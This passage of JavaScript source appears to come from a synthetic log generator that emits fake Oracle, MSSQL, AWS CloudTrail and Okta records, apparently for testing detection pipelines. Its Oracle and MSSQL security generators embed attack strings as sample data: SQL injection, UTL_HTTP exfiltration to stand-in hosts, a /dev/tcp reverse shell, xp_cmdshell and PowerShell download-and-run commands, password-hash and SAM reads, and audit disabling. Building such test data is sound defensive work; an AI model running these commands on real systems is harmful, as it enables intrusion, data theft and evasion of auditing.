  if(isError){const errCode=pick(ORACLE_ERROR_CODES);return`${line1}\n${errCode}: ${ORACLE_ERROR_MSGS[errCode]||'Database error occurred'}`;}
  const seq=rand(10000,99999),logNum=rand(1,5);
  return`${line1}\nThread 1 advanced to log sequence ${seq} (LGWR switch)\n  Current log# ${logNum} seq# ${seq} mem# 0: /u01/app/oracle/oradata/ORCL/redo0${logNum}.log`;
}
function genOracleListener(ts){
  const clientIp=randomIP(),svc=pick(ORACLE_SERVICE_NAMES),port=rand(1024,65535);
  const prog=pick(['JDBC Thin Client','OCI','SQL*Plus','Python cx_Oracle','node-oracledb']);
  const status=Math.random()<0.05?'12514':'0';
  return`${oracleListenerTs(ts)} * (CONNECT_DATA=(SERVER=DEDICATED)(SERVICE_NAME=${svc})(CID=(PROGRAM=${prog})(HOST=${clientIp})(USER=oracle))) * (ADDRESS=(PROTOCOL=tcp)(HOST=${clientIp})(PORT=${port})) * establish * ${svc} * ${status}`;
}
function genOracleMetrics(ts){
  const host=pick(ORACLE_HOSTS);
  return JSON.stringify({'@timestamp':oracleIsoTs(ts),host:{name:host,hostname:host},oracle:{performance:{db_time_ms:rand(1000,50000),physical_reads:rand(0,5000),logical_reads:rand(5000,200000),hard_parses:rand(0,500),soft_parses:rand(500,10000),redo_size_bytes:rand(100000,10000000),sessions_active:rand(10,500),sessions_inactive:rand(0,100),wait_time:{db_file_sequential_read_ms:rand(0,2000),log_file_sync_ms:rand(0,500),buffer_busy_waits_ms:rand(0,200),latch_free_ms:rand(0,50)}}},event:{dataset:'oracle.performance',module:'oracle',kind:'metric'}});
}
function genOracleSecurity(ts){
  const r=Math.random(),host=pick(ORACLE_HOSTS),clientIp=randomIP(),dbid=pick(ORACLE_DBIDS),port=rand(1024,65535);
  const addr=`(ADDRESS=(PROTOCOL=tcp)(HOST=${clientIp})(PORT=${port}))`;
  let user=pick(ORACLE_USERS),action,sql,status='0';
  if(r<0.13){
    action='SELECT';
    sql=pick([
      `SELECT * FROM HR.EMPLOYEES WHERE ID=1 UNION SELECT USERNAME,PASSWORD_VERSIONS,NULL,NULL,NULL FROM DBA_USERS--`,
      `SELECT * FROM OE.ORDERS WHERE ORDER_ID=1 OR 1=1--`,
      `SELECT UTL_HTTP.REQUEST('http://10.10.10.50/exfil?data='||LISTAGG(USERNAME,',') WITHIN GROUP (ORDER BY 1)) FROM DBA_USERS`,
      `SELECT * FROM HR.EMPLOYEES WHERE LAST_NAME=''--' OR '1'='1`,
    ]);
  } else if(r<0.27){
    action='SELECT';
    sql=pick([
      `SELECT USERNAME,ACCOUNT_STATUS,PASSWORD_VERSIONS FROM DBA_USERS`,
      `SELECT GRANTEE,GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE ADMIN_OPTION='YES'`,
      `SELECT VALUE FROM V$PARAMETER WHERE NAME='audit_trail'`,
      `SELECT * FROM V$SESSION WHERE TYPE='USER'`,
      `SELECT OWNER,OBJECT_NAME FROM DBA_OBJECTS WHERE OBJECT_TYPE='TABLE' AND ROWNUM<=500`,
      `SELECT GRANTEE,PRIVILEGE FROM DBA_SYS_PRIVS WHERE PRIVILEGE='DBA'`,
    ]);
  } else if(r<0.40){
    action='EXECUTE';
    sql=pick([
      `GRANT DBA TO ${user}`,
      `GRANT EXECUTE ON UTL_HTTP TO ${user}`,
      `GRANT EXECUTE ON UTL_FILE TO ${user}`,
      `EXEC DBMS_SCHEDULER.CREATE_JOB(job_name=>'SYS_UPDATE',job_type=>'EXECUTABLE',job_action=>'/bin/sh -c "bash -i >& /dev/tcp/${clientIp}/4444 0>&1"',enabled=>TRUE)`,
      `EXEC SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA('CTXSYS','CONTEXT','SYS.DBMS_EXPORT_EXTENSION.DISP_SQL_STMT(''GRANT DBA TO ${user.toLowerCase()}'')',1,'1',0)`,
    ]);
    status=Math.random()<0.3?pick(['1031','1017']):'0';
  } else if(r<0.52){
    action='EXECUTE';
    sql=pick([
      `SELECT UTL_HTTP.REQUEST('http://192.168.100.50:8080/exfil?d='||UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(EMAIL||CHR(58)||TO_CHAR(SALARY))))) FROM HR.EMPLOYEES FETCH FIRST 50 ROWS ONLY`,
      `SELECT UTL_HTTP.REQUEST('http://attacker.io/c2?host='||SYS_CONTEXT('USERENV','SERVER_HOST')) FROM DUAL`,
      `EXEC UTL_HTTP.SET_PROXY('http://${clientIp}:3128','')`,
    ]);
  } else if(r<0.63){
    action='SELECT';
    sql=pick([
      `CREATE DATABASE LINK priv_link CONNECT TO SYSTEM IDENTIFIED BY "Oracle123" USING '${clientIp}:1521/ORCL'`,
      `SELECT * FROM HR.EMPLOYEES@priv_link`,
      `SELECT * FROM ALL_DB_LINKS`,
    ]);
  } else if(r<0.75){
    action='LOGON';
    user=pick(['SYS','SYSTEM','ADMIN','DBA','ORACLE','SA','DBSNMP']);
    status=pick(['1017','1017','28000','28001']);
    sql='';
  } else if(r<0.86){
    action='DELETE';
    sql=pick([
      `DELETE FROM SYS.AUD$ WHERE TIMESTAMP# < SYSDATE-1`,
      `NOAUDIT ALL`,
      `ALTER SYSTEM SET AUDIT_TRAIL=NONE SCOPE=SPFILE`,
      `EXEC DBMS_AUDIT_MGMT.CLEAR_AUDIT_TRAIL(DBMS_AUDIT_MGMT.AUDIT_TRAIL_ALL,TRUE)`,
    ]);
  } else {
    action='EXECUTE';
    sql=`EXEC DBMS_SCHEDULER.CREATE_JOB(job_name=>'WIN_UPDATE',job_type=>'PLSQL_BLOCK',job_action=>'BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO ${user.toLowerCase()}''; END;',repeat_interval=>'FREQ=DAILY',enabled=>TRUE)`;
  }
  return`${oracleIsoTs(ts)} LENGTH: "200" ACTION :[${action.length}] "${action}" DATABASE USER:[${user.length}] "${user}" PRIVILEGE :[4] "NONE" CLIENT USER:[6] "oracle" STATUS:[${status.length}] "${status}" CLIENT ADDRESS:[${addr.length}] "${addr}" USERHOST:[${host.length}] "${host}.corp" DBID:[10] "${dbid}" SQLTEXT:[${sql.length}] "${sql}"`;
}

function generateOracleLogs(count,tr,types=ORACLE_TYPES_DEFAULT){
  const active=types.length?types:ORACLE_TYPES_DEFAULT;
  const W={audit:30,alert:20,listener:20,metrics:15,security:15};
  const filtered=Object.entries(W).filter(([t])=>active.includes(t));
  const total=filtered.reduce((s,[,w])=>s+w,0);
  return generateTimestamps(count,tr).map(ts=>{
    let r=Math.random()*total,cum=0;
    for(const[t,w]of filtered){cum+=w;if(r<cum)return t==='audit'?genOracleAudit(ts):t==='alert'?genOracleAlert(ts):t==='listener'?genOracleListener(ts):t==='security'?genOracleSecurity(ts):genOracleMetrics(ts);}
    return genOracleMetrics(ts);
  });
}

// ─── MSSQL Generators ────────────────────────────────────────────────────────
function genMSSQLAudit(ts){
  const user=pick(MSSQL_USERS),db=pick(MSSQL_DATABASES),table=pick(MSSQL_TABLES);
  const schema=table.split('.')[0],obj=table.split('.')[1];
  const action=pick(MSSQL_AUDIT_ACTIONS),label=MSSQL_AUDIT_ACTION_LABELS[action];
  const sid=rand(1,255),succ=Math.random()>0.07,clientIp=randomIP();
  const stmts={SL:`SELECT * FROM ${table} WHERE ID=${rand(1,9999)}`,IN:`INSERT INTO ${table} (Col1,Col2) VALUES ('val1','val2')`,UP:`UPDATE ${table} SET Status='Active' WHERE ID=${rand(1,9999)}`,DL:`DELETE FROM ${table} WHERE ID=${rand(1,9999)}`,EX:`EXEC ${schema}.usp_GetData @ID=${rand(1,9999)}`,AU:`ALTER SERVER AUDIT MyAudit ENABLE`,LO:''};
  return JSON.stringify({event_time:ts.toISOString(),action_id:action,action_name:label,succeeded:succ,session_id:sid,server_principal_name:user,database_name:db,schema_name:schema,object_name:obj,statement:stmts[action]||'',client_ip:clientIp});
}
function genMSSQLErrorLog(ts){
  const r=Math.random(),spid=`spid${rand(1,255)}`;
  if(r<0.20){const user=pick(MSSQL_USERS),ip=randomIP();return`${mssqlTs(ts)} ${spid.padEnd(12)} Login failed for user '${user}'. Reason: Password did not match that for the login provided. [CLIENT: ${ip}]`;}
  if(r<0.35){const db=pick(MSSQL_DATABASES);return`${mssqlTs(ts)} ${spid.padEnd(12)} Starting up database '${db}'.`;}
  if(r<0.50){const db=pick(MSSQL_DATABASES);return`${mssqlTs(ts)} Backup       Database backed up. Database: ${db}, pages dumped: ${rand(100,50000)}, first LSN: ${rand(10000,99999)}:${rand(100,999)}:1, last LSN: ${rand(100000,999999)}:${rand(100,999)}:1.`;}
  if(r<0.62){const [code,msg]=pick(Object.entries(MSSQL_ERROR_CODES)),obj=pick(MSSQL_TABLES);return`${mssqlTs(ts)} ${spid.padEnd(12)} Error: ${code}, Severity: ${rand(11,25)}, State: 1. ${msg} '${obj}'.`;}
  if(r<0.75){return`${mssqlTs(ts)} spid${rand(1,10).toString().padEnd(10)} Checkpoint complete: ${rand(100,5000)} log records flushed.`;}
  if(r<0.87){return`${mssqlTs(ts)} ${spid.padEnd(12)} Transaction (Process ID ${rand(50,200)}) was deadlocked on lock resources with another process and has been chosen as the deadlock victim. Rerun the transaction.`;}
  return`${mssqlTs(ts)} ${spid.padEnd(12)} Memory grant request ${rand(1024,65536)} KB waiting ${rand(100,5000)} ms for resource.`;
}
function genMSSQLAgent(ts){
  const r=Math.random();
  if(r<0.30){const[code,desc]=pick(Object.entries(MSSQL_ERROR_CODES));return`${mssqlTs(ts)} - ! [${rand(200,399)}] SQLServer Error: ${code}, ${desc}. [SQLSTATE ${pick(['42S02','23000','40001','22001'])}]`;}
  if(r<0.45){return`${mssqlTs(ts)} - + [260] Unable to start mail session (reason: No mail profile defined)`;}
  if(r<0.65){const job=pick(['DailyBackup','WeeklyIndex','HourlyETL','NightlyStats','LogShipping']);return`${mssqlTs(ts)} - I [364] Job '${job}' started at step 1`;}
  if(r<0.82){const job=pick(['DailyBackup','WeeklyIndex','HourlyETL','NightlyStats','LogShipping']),ok=Math.random()>0.15;return`${mssqlTs(ts)} - ${ok?'+':'!'} [208] Job '${job}' ${ok?'succeeded':'failed'}.`;}
  return`${mssqlTs(ts)} - ? [098] SQLServerAgent terminated (normally)`;
}
// TSDB data streams only accept timestamps within ~2h of now — always generate fresh
const tsdbNow=()=>new Date(Date.now()-rand(0,90*60*1000));
function genMSSQLTransactionLog(_ts){
  const db=pick(MSSQL_DATABASES),host=pick(MSSQL_HOSTS);
  const ts=tsdbNow(); // override batch ts — TSDB rejects historical timestamps
  const totalSize=rand(67108864,2147483648);
  const usedSize=Math.floor(totalSize*(Math.random()*0.8+0.05));
  return JSON.stringify({log_type:'transaction_log','@timestamp':ts.toISOString(),host:{name:host,hostname:host},mssql:{metrics:{server_name:host,instance_name:'MSSQLSERVER',database_name:db,database_id:rand(1,100),total_log_size_bytes:totalSize,total_log_size:totalSize,used_log_space_bytes:usedSize,used_log_space_pct:+((usedSize/totalSize)*100).toFixed(2),active_log_size:Math.floor(usedSize*0.3),active_vlf_count:rand(4,128),log_since_last_checkpoint:rand(0,Math.floor(usedSize*0.5)),log_since_last_log_backup:rand(0,usedSize),log_space_in_bytes_since_last_backup:rand(0,usedSize),log_recovery_size:rand(0,usedSize),log_backup_time:new Date(ts.getTime()-rand(0,3600000)).toISOString()}},event:{dataset:'mssql.transaction_log',module:'mssql',kind:'metric'}});
}
function genMSSQLMetrics(_ts){
  const host=pick(MSSQL_HOSTS);
  const ts=tsdbNow();
  return JSON.stringify({'@timestamp':ts.toISOString(),host:{name:host,hostname:host},mssql:{metrics:{server_name:host,instance_name:'MSSQLSERVER',batch_requests_sec:rand(100,10000),user_connections:rand(5,500),buffer_cache_hit_ratio:rand(85,100),page_life_expectancy_sec:rand(300,86400),lock_waits_per_sec:rand(0,200),deadlocks_per_sec:rand(0,10),range_scans_per_sec:rand(0,500),target_server_memory_kb:rand(2097152,67108864),total_server_memory_kb:rand(1048576,67108864)}},event:{dataset:'mssql.performance',module:'mssql',kind:'metric'}});
}
function genMSSQLSecurity(ts){
  const r=Math.random(),user=pick(MSSQL_USERS),db=pick(MSSQL_DATABASES),clientIp=randomIP(),sid=rand(1,255);
  let action='EX',actionLabel='EXECUTE',stmt='',succeeded=true,objName='';
  if(r<0.15){
    objName='xp_cmdshell';
    stmt=pick([
      `EXEC xp_cmdshell 'whoami'`,
      `EXEC xp_cmdshell 'net user hacker P@ssw0rd123 /add'`,
      `EXEC xp_cmdshell 'powershell -enc ${randomHex(80)}'`,
      `EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.10.50/svhost.exe C:\\Windows\\Temp\\svhost.exe && C:\\Windows\\Temp\\svhost.exe'`,
      `EXEC xp_cmdshell 'cmd /c net localgroup administrators hacker /add'`,
    ]);
  } else if(r<0.28){
    objName='sp_configure';
    stmt=pick([
      `EXEC sp_configure 'show advanced options', 1; RECONFIGURE`,
      `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE WITH OVERRIDE`,
      `EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE`,
      `EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE`,
    ]);
  } else if(r<0.38){
    objName='sp_OACreate';
    stmt=pick([
      `DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://${clientIp}/s'')'`,
      `DECLARE @o INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @o OUT; EXEC sp_OAMethod @o, 'OpenTextFile', NULL, 'C:\\Windows\\System32\\drivers\\etc\\hosts', 1`,
    ]);
  } else if(r<0.48){
    action='SL'; actionLabel='SELECT'; objName='OPENROWSET';
    stmt=pick([
      `SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\config\\SAM', SINGLE_BLOB) AS x`,
      `SELECT * FROM OPENROWSET('SQLOLEDB','server=${clientIp};uid=sa;pwd=Password1','SELECT name,password_hash FROM master.sys.sql_logins')`,
      `INSERT INTO ##exfil SELECT * FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_BLOB) AS x`,
    ]);
  } else if(r<0.58){
    objName='sys.sql_logins';
    stmt=pick([
      `EXECUTE AS LOGIN = 'sa'`,
      `EXEC sp_addsrvrolemember '${user}', 'sysadmin'`,
      `ALTER SERVER ROLE sysadmin ADD MEMBER [${user}]`,
      `SELECT name,password_hash FROM master.sys.sql_logins`,
    ]);
  } else if(r<0.68){
    action='SL'; actionLabel='SELECT'; objName='dbo.Users';
    stmt=pick([
      `SELECT * FROM dbo.Users WHERE Username='' OR '1'='1'--`,
      `SELECT * FROM dbo.Orders WHERE OrderID=1; WAITFOR DELAY '0:0:5'--`,
      `SELECT * FROM dbo.Customers WHERE ID=1 UNION SELECT name,password_hash,NULL,NULL FROM master.sys.sql_logins--`,
    ]);
    succeeded=Math.random()>0.4;
  } else if(r<0.78){
    objName='master.sys.xp_dirtree';
    stmt=pick([
      `EXEC master.sys.xp_dirtree 'C:\\',1,1`,
      `EXEC master.sys.xp_dirtree '\\\\${clientIp}\\share',1,1`,
      `SELECT name,password_hash FROM master.sys.sql_logins`,
      `SELECT * FROM master.sys.server_principals WHERE type='S'`,
    ]);
  } else if(r<0.87){
    action='IN'; actionLabel='INSERT'; objName='master.sys.servers';
    stmt=pick([
      `EXEC sp_addlinkedserver @server='PIVOT', @srvproduct='', @provider='SQLOLEDB', @datasrc='${clientIp},1433'`,
      `EXEC sp_addlinkedsrvlogin @rmtsrvname='PIVOT', @useself='FALSE', @rmtuser='sa', @rmtpassword='Password1'`,
      `SELECT * FROM PIVOT.master.dbo.sysdatabases`,
    ]);
  } else {
    action='AU'; actionLabel='ALTER SERVER AUDIT'; objName='SecurityAudit';
    stmt=pick([
      `ALTER SERVER AUDIT [SecurityAudit] DISABLE`,
      `DROP SERVER AUDIT [SecurityAudit]`,
      `EXEC sp_configure 'common criteria compliance enabled', 0; RECONFIGURE`,
    ]);
  }
  return JSON.stringify({event_time:ts.toISOString(),action_id:action,action_name:actionLabel,succeeded,session_id:sid,server_principal_name:user,database_name:db,schema_name:'dbo',object_name:objName,statement:stmt,client_ip:clientIp});
}

function generateMSSQLLogs(count,tr,types=MSSQL_TYPES_DEFAULT){
  const active=types.length?types:MSSQL_TYPES_DEFAULT;
  const W={audit:18,errorlog:20,translog:25,agent:12,metrics:10,security:15};
  const filtered=Object.entries(W).filter(([t])=>active.includes(t));
  const total=filtered.reduce((s,[,w])=>s+w,0);
  return generateTimestamps(count,tr).map(ts=>{
    let r=Math.random()*total,cum=0;
    for(const[t,w]of filtered){cum+=w;if(r<cum)return t==='audit'?genMSSQLAudit(ts):t==='errorlog'?genMSSQLErrorLog(ts):t==='translog'?genMSSQLTransactionLog(ts):t==='agent'?genMSSQLAgent(ts):t==='security'?genMSSQLSecurity(ts):genMSSQLMetrics(ts);}
    return genMSSQLMetrics(ts);
  });
}

// ─── AWS CloudTrail Generator ─────────────────────────────────────────────────
function genCTManagement(ts){
  const r=Math.random(),account=pick(CT_ACCOUNTS),region=pick(CT_REGIONS),user=randomUser();
  const isErr=Math.random()<0.08;
  let eventName,eventSource,reqParams={};
  if(r<0.08){eventName='ConsoleLogin';eventSource='signin.amazonaws.com';}
  else if(r<0.16){eventName='RunInstances';eventSource='ec2.amazonaws.com';}
  else if(r<0.24){eventName='StopInstances';eventSource='ec2.amazonaws.com';reqParams={instanceIds:[`i-${randomHex(17)}`]};}
  else if(r<0.32){eventName='DescribeInstances';eventSource='ec2.amazonaws.com';}
  else if(r<0.40){eventName='AuthorizeSecurityGroupIngress';eventSource='ec2.amazonaws.com';reqParams={groupId:`sg-${randomHex(8)}`,ipPermissions:[{ipProtocol:'tcp',fromPort:rand(1,65535),toPort:rand(1,65535),ipRanges:[{cidrIp:'0.0.0.0/0'}]}]};}
  else if(r<0.48){eventName='InvokeFunction';eventSource='lambda.amazonaws.com';reqParams={functionName:`fn-${randomUser()}`};}
  else if(r<0.56){eventName='GetSecretValue';eventSource='secretsmanager.amazonaws.com';reqParams={secretId:`/prod/${pick(['db-password','api-key','jwt-secret'])}`};}
  else if(r<0.64){eventName='CreateSnapshot';eventSource='ec2.amazonaws.com';}
  else if(r<0.72){eventName='DescribeDBInstances';eventSource='rds.amazonaws.com';}
  else if(r<0.80){eventName='CreateStack';eventSource='cloudformation.amazonaws.com';}
  else if(r<0.88){eventName='ListFunctions20150331';eventSource='lambda.amazonaws.com';}
  else{eventName='DescribeSecurityGroups';eventSource='ec2.amazonaws.com';}
  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:'IAMUser',principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:user/${user}`,accountId:account,userName:user},eventTime:ts.toISOString(),eventSource,eventName,awsRegion:region,sourceIPAddress:randomIP(),userAgent:pick(['aws-cli/2.13.0 Python/3.11.0','Mozilla/5.0 (Macintosh) AppleWebKit/537.36','Boto3/1.28.0 Python/3.11.0','console.amazonaws.com']),requestParameters:reqParams,responseElements:null,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account,...(isErr?{errorCode:pick(['AccessDenied','InvalidParameterValue','ThrottlingException']),errorMessage:'Access denied for this operation'}:{})});
}
function genCTIAM(ts){
  const r=Math.random(),account=pick(CT_ACCOUNTS),user=randomUser(),target=randomUser();
  let eventName,extra={};
  if(r<0.12){eventName='CreateUser';extra={requestParameters:{userName:target}};}
  else if(r<0.22){eventName='DeleteUser';extra={requestParameters:{userName:target}};}
  else if(r<0.32){eventName='AttachRolePolicy';extra={requestParameters:{roleName:`svc-${target}`,policyArn:`arn:aws:iam::aws:policy/${pick(['AdministratorAccess','PowerUserAccess','ReadOnlyAccess','SecurityAudit'])}`}};}
  else if(r<0.42){eventName='CreateAccessKey';extra={requestParameters:{userName:target}};}
  else if(r<0.52){eventName='AssumeRole';extra={requestParameters:{roleArn:`arn:aws:iam::${pick(CT_ACCOUNTS)}:role/${pick(['OrganizationAccountAccessRole','DevOpsRole','SecurityAuditRole','CrossAccountAdmin'])}`}};}
  else if(r<0.62){eventName='DeactivateMFADevice';extra={requestParameters:{userName:target,serialNumber:`arn:aws:iam::${account}:mfa/${target}`}};}
  else if(r<0.72){eventName='CreateRole';extra={requestParameters:{roleName:`role-${randomHex(6)}`}};}
  else if(r<0.82){eventName='AddUserToGroup';extra={requestParameters:{groupName:pick(['Admins','Developers','SecurityTeam','ReadOnly']),userName:target}};}
  else if(r<0.90){eventName='UpdateAccountPasswordPolicy';}
  else{eventName='PutRolePolicy';extra={requestParameters:{roleName:`svc-${target}`,policyName:'InlinePolicy'}};}
  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:'IAMUser',principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:user/${user}`,accountId:account,userName:user},eventTime:ts.toISOString(),eventSource:'iam.amazonaws.com',eventName,awsRegion:'us-east-1',sourceIPAddress:randomIP(),userAgent:pick(['aws-cli/2.13.0','Boto3/1.28.0','console.amazonaws.com']),...extra,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account});
}
function genCTS3(ts){
  const r=Math.random(),account=pick(CT_ACCOUNTS),region=pick(CT_REGIONS),user=randomUser();
  const bucket=`${pick(['logs','data','backups','uploads','exports','corp'])}-${randomHex(8)}`;
  const key=`${pick(['financial','hr','config','exports','confidential'])}/${rand(2024,2025)}/${randomHex(8)}.${pick(['csv','json','zip','pdf','xlsx'])}`;
  let eventName;
  if(r<0.30)eventName='GetObject';
  else if(r<0.50)eventName='PutObject';
  else if(r<0.62)eventName='ListBuckets';
  else if(r<0.72)eventName='CreateBucket';
  else if(r<0.82)eventName='DeleteObject';
  else if(r<0.90)eventName='GetBucketAcl';
  else eventName='PutBucketPolicy';
  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:pick(['IAMUser','AssumedRole']),principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:user/${user}`,accountId:account,userName:user},eventTime:ts.toISOString(),eventSource:'s3.amazonaws.com',eventName,awsRegion:region,sourceIPAddress:randomIP(),userAgent:pick(['aws-cli/2.13.0','Boto3/1.28.0','S3 Console']),requestParameters:{bucketName:bucket,...(eventName!=='ListBuckets'&&eventName!=='CreateBucket'?{key}:{})},responseElements:null,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account,resources:[{ARN:`arn:aws:s3:::${bucket}/${key}`,accountId:account,type:'AWS::S3::Object'}]});
}
function genCTSecurity(ts){
  const r=Math.random(),account=pick(CT_ACCOUNTS),region=pick(CT_REGIONS),user=randomUser();
  const isRoot=r<0.06;
  let eventName,eventSource;
  if(r<0.15){eventName='DeleteTrail';eventSource='cloudtrail.amazonaws.com';}
  else if(r<0.28){eventName='StopLogging';eventSource='cloudtrail.amazonaws.com';}
  else if(r<0.40){eventName='PutEventSelectors';eventSource='cloudtrail.amazonaws.com';}
  else if(r<0.52){eventName='DisableKey';eventSource='kms.amazonaws.com';}
  else if(r<0.64){eventName='ScheduleKeyDeletion';eventSource='kms.amazonaws.com';}
  else if(r<0.76){eventName='GetPasswordData';eventSource='ec2.amazonaws.com';}
  else if(r<0.88){eventName='GetSecretValue';eventSource='secretsmanager.amazonaws.com';}
  else{eventName='CreateVpcPeeringConnection';eventSource='ec2.amazonaws.com';}
  return JSON.stringify({eventVersion:'1.08',userIdentity:{type:isRoot?'Root':'IAMUser',principalId:`AIDA${randomHex(20).toUpperCase()}`,arn:`arn:aws:iam::${account}:${isRoot?'root':('user/'+user)}`,accountId:account,...(isRoot?{}:{userName:user})},eventTime:ts.toISOString(),eventSource,eventName,awsRegion:region,sourceIPAddress:randomIP(),userAgent:'aws-cli/2.13.0',requestParameters:{},responseElements:null,requestID:randomHex(36),eventID:randomHex(36),eventType:'AwsApiCall',recipientAccountId:account});
}
function generateCloudTrailLogs(count,tr,types=CT_TYPES_DEFAULT){
  const gens=[];
  if(types.includes('management'))gens.push(genCTManagement,genCTManagement);
  if(types.includes('iam'))gens.push(genCTIAM);
  if(types.includes('s3_data'))gens.push(genCTS3,genCTS3);
  if(types.includes('security'))gens.push(genCTSecurity);
  if(gens.length===0)gens.push(genCTManagement);
  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
}

// ─── Okta Generator ───────────────────────────────────────────────────────────
function genOktaAuth(ts){
  const r=Math.random(),isFailure=r>0.75,user=randomEmail();
  let eventType,severity,reason=null;
  if(isFailure){
    eventType=pick(['user.session.start','user.authentication.auth_via_mfa','user.authentication.sso']);
    severity='WARN';reason=pick(['INVALID_CREDENTIALS','MFA_ENROLL_NOT_ALLOWED','FACTOR_TIMEOUT','USER_LOCKED','NETWORK_ZONE_BLACKLIST']);
  }else{
    eventType=r<0.3?'user.session.start':r<0.5?'user.authentication.sso':r<0.65?'user.authentication.auth_via_mfa':r<0.75?'user.session.end':'user.authentication.auth_via_radius';
    severity='INFO';
  }
  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:user,displayName:user.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:pick(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15','okta-auth-js/7.0.0'])},geographicalContext:{city:pick(['New York','London','San Francisco','Chicago','Berlin']),country:pick(['United States','United Kingdom','Germany']),state:pick(['NY','CA','IL','TX'])}},authenticationContext:{authenticationStep:0,externalSessionId:`idx${randomHex(20)}`,...(isFailure?{}:{credentialProvider:pick(['OKTA_CREDENTIAL_PROVIDER','IDP']),credentialType:pick(['password','PASSWORD_WITH_MFA'])})},displayMessage:isFailure?'User login to Okta failed':'User login to Okta',eventType,outcome:{result:isFailure?'FAILURE':'SUCCESS',...(reason?{reason}:{})},published:ts.toISOString(),securityContext:{asNumber:rand(10000,65000),asOrg:pick(['AS-ACME','TELENET','AS-CORP']),domain:randomDomain(),isProxy:Math.random()<0.05,isp:pick(['Comcast','AT&T','BT','Deutsche Telekom'])},severity,target:[{id:`00u${randomHex(17)}`,type:'User',alternateId:user,displayName:user.split('@')[0]}],transaction:{type:'WEB',id:randomHex(36)},uuid:randomHex(36),version:'0'});
}
function genOktaLifecycle(ts){
  const r=Math.random(),actor=randomEmail(),target=randomEmail();
  let eventType,severity='INFO';
  if(r<0.15){eventType='user.lifecycle.create';}
  else if(r<0.25){eventType='user.lifecycle.deactivate';severity='WARN';}
  else if(r<0.35){eventType='user.lifecycle.suspend';severity='WARN';}
  else if(r<0.45){eventType='user.account.update_password';}
  else if(r<0.55){eventType='user.mfa.factor.activate';}
  else if(r<0.65){eventType='user.mfa.factor.deactivate';severity='WARN';}
  else if(r<0.78){eventType='group.user_membership.add';}
  else if(r<0.88){eventType='group.user_membership.remove';}
  else{eventType='user.lifecycle.unsuspend';}
  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:actor,displayName:actor.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:'Okta-Admin-Console/1.0'},geographicalContext:{country:'United States',city:'New York'}},displayMessage:eventType.replace(/\./g,' ').replace(/_/g,' '),eventType,outcome:{result:'SUCCESS'},published:ts.toISOString(),severity,target:[{id:`00u${randomHex(17)}`,type:'User',alternateId:target,displayName:target.split('@')[0]},...(eventType.includes('group')?[{id:`00g${randomHex(17)}`,type:'UserGroup',alternateId:pick(['Admins','Developers','SecurityTeam','ReadOnly']),displayName:pick(['Admins','Developers','SecurityTeam','ReadOnly'])}]:[])],uuid:randomHex(36),version:'0'});
}
function genOktaPolicy(ts){
  const r=Math.random(),actor=randomEmail();
  let eventType,severity='INFO';
  if(r<0.20){eventType='policy.lifecycle.create';}
  else if(r<0.40){eventType='policy.lifecycle.update';}
  else if(r<0.50){eventType='policy.lifecycle.delete';severity='WARN';}
  else if(r<0.65){eventType='policy.rule.add';}
  else if(r<0.80){eventType='policy.rule.update';}
  else{eventType='policy.rule.delete';severity='WARN';}
  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:actor,displayName:actor.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:'Okta-Admin-Console/1.0'}},displayMessage:eventType.replace(/\./g,' ').replace(/_/g,' '),eventType,outcome:{result:'SUCCESS'},published:ts.toISOString(),severity,target:[{id:`00p${randomHex(17)}`,type:'Policy',alternateId:pick(['Default Policy','MFA Enrollment','Sign-On Policy','Password Policy','Device Trust']),displayName:pick(['Default Policy','MFA Enrollment','Sign-On Policy','Password Policy','Device Trust'])}],uuid:randomHex(36),version:'0'});
}
function genOktaApp(ts){
  const actor=randomEmail(),app=pick(OKTA_APPS);
  const r=Math.random();
  let eventType;
  if(r<0.2)eventType='application.lifecycle.create';
  else if(r<0.35)eventType='application.lifecycle.update';
  else if(r<0.45)eventType='application.lifecycle.deactivate';
  else if(r<0.62)eventType='user.authentication.sso';
  else if(r<0.78)eventType='application.provision.create_user';
  else eventType='application.provision.deactivate_user';
  return JSON.stringify({actor:{id:`00u${randomHex(17)}`,type:'User',alternateId:actor,displayName:actor.split('@')[0]},client:{ipAddress:randomIP(),userAgent:{rawUserAgent:'Okta-Admin-Console/1.0'}},displayMessage:`${eventType.replace(/\./g,' ')} for ${app}`,eventType,outcome:{result:'SUCCESS'},published:ts.toISOString(),severity:'INFO',target:[{id:`0oa${randomHex(17)}`,type:'AppInstance',alternateId:app,displayName:app}],uuid:randomHex(36),version:'0'});
}
